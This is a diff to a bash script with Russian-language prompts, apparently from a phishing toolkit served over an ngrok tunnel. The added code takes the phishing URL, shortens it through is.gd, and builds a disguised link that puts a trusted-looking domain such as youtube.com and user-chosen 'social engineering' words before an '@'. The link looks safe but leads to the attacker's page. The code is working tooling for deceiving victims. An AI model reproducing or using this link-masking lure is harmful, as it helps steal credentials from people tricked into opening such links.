@@ -192,6 +192,35 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] прямая ссылка:\e[0m\e[1;77m %s\e[0m\n" $link
 
+url_checker() {
+    if [ ! "${1//:*}" = http ]; then
+        if [ ! "${1//:*}" = https ]; then
+            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
+            exit 1
+        fi
+    fi
+}
+echo -n "Вставьте ngrok url сюда(С http или https): "
+read phish
+url_checker $phish
+sleep 1
+echo "Модификация ссылки..."
+echo ""
+short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
+shorter=${short#https://}
+echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
+echo 'домен для подмены ссылки(С http или https), default: https://youtube.com, http
+://anything.org) :'
+echo -en "\e[32m=>\e[0m "
+read mask
+url_checker $mask
+echo -e '\nВведите СИ слова(Тут по вашей фантазии)'
+echo -e "\e[31mНе используйте пробел. Используйте '-' Между СИ словами\e[0m"
+echo -en "\e[32m=>\e[0m "
+read words
+echo -e "\nГенерация новой ссылки..\n"
+final=$mask-$words@$shorter
+echo -e "Ваша новая ссылка:\e[32m ${final} \e[0m\n"
 payload_ngrok
 checkfound
 }
